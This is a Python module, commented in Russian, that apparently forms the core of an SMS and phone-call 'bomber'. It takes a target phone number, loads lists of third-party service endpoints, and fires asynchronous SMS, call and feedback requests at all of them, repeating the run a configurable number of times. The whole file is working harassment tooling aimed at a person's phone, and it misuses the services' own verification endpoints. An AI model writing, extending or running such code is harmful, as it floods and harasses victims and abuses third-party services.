from asyncio import ensure_future, gather, run, TimeoutError
from aiohttp import ClientSession
from urllib.parse import urlparse
import logging
from colorama import Fore

from Core.Attack.Services import urls
from Core.Attack.Feedback_Services import feedback_urls
from Core.Config import check_config

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(message)s')

# Цвета с использованием ANSI escape-кодов
COLOR_GREEN = "\033[92m"
COLOR_RED = "\033[91m"
COLOR_CYAN = "\033[96m"
COLOR_RESET = "\033[0m"

async def request(session, url):
    try:
        type_attack = ('SMS', 'CALL', 'FEEDBACK') if check_config()['type_attack'] == 'MIX' else check_config()['type_attack']

        if url['info']['attack'] in type_attack:
            async with session.request(
                url['method'], url['url'], 
                params=url.get('params'), cookies=url.get('cookies'), 
                headers=url.get('headers'), data=url.get('data'), 
                json=url.get('json'), timeout=10
            ) as response:
                if response.status == 200:
                    domain = urlparse(url['url']).netloc
                    print(Fore.GREEN + "Успешно: " + Fore.CYAN + f"{domain}")
                return await response.text()
    except TimeoutError:
        domain = urlparse(url['url']).netloc
        print(Fore.RED + f"Таймаут: " + Fore.CYAN + f"{domain}")
    except Exception:
        domain = urlparse(url['url']).netloc
        print(Fore.RED + f"Ошибка: " + Fore.CYAN + f"{domain}")

async def async_attacks(number):
    async with ClientSession() as session:
        services = (urls(number) + feedback_urls(number)) if check_config()['feedback'] == 'True' else urls(number)
        tasks = [ensure_future(request(session, service)) for service in services]
        await gather(*tasks)

def start_async_attacks(number, replay):
    '''Запуск бомбера'''
    for _ in range(int(replay)):
        run(async_attacks(number))
